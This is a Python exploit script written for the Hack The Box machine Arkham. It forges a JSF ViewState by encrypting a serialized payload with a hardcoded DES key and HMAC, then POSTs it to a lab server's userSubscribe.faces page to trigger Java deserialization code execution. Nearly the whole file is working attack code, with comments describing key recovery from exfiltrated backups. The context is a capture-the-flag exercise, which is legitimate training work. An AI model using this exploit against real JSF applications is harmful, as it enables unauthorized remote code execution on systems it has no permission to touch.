#!/usr/bin/env python3

# This script originally created by S4vitar
# This script attempts to abuse the viewstate find out more from `book.hacktricks.xyz/pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization`
# This script is for HTB Arkham. For decoding the long base64 string below.
# The idea to decode this string was inspired from this config file `web.xml.bak` that was exfiltrated from the backup.img
# The backup.img was exfiltrated form the smb share /BatmanShare/appserver.backup

import pyDes
import requests
import signal
import sys
import time
import hmac
from hashlib import sha1
from base64 import b64encode, b64decode

def def_handler(sig, frame):
    print("\n\n[!] Exiting the des_viewstate_decoder script...\n")
    sys.exit(1)

# CTRL + C
signal.signal(signal.SIGINT, def_handler)
#time.sleep(10)

# GLOBAL VARIABLES
main_url = "http://10.129.228.116:8080/userSubscribe.faces"

def createpayload():
    payload = open("/home/shadow42/haCk54CrAcK/arkham/payload.bin", 'rb').read()
    return encrypt_data(payload)

def encrypt_data(payload):
    key = b64decode('SnNGOTg3Ni0=')
    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
    encrypted_data = obj.encrypt(payload)
    hash_value = (hmac.new(key, bytes(encrypted_data), sha1).digest())
    encrypted_view_state = encrypted_data + hash_value
    return b64encode(encrypted_view_state)

def decrypt_view_state(viewstate):
    key = b64decode('SnNGOTg3Ni0=')
    viewstate = b64decode(viewstate)
    viewstate += b'\x00\x00\x00\x00'
    obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)
    view_state_decrypted = obj.decrypt(viewstate)
    return view_state_decrypted

#print(decrypt_view_state("wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg="))

def exploit():
    viewState = createpayload()
    data_post = {
        'javax.faces.ViewState': viewState
    }

    r = requests.post(main_url, data=data_post)

exploit()

#print(createpayload())


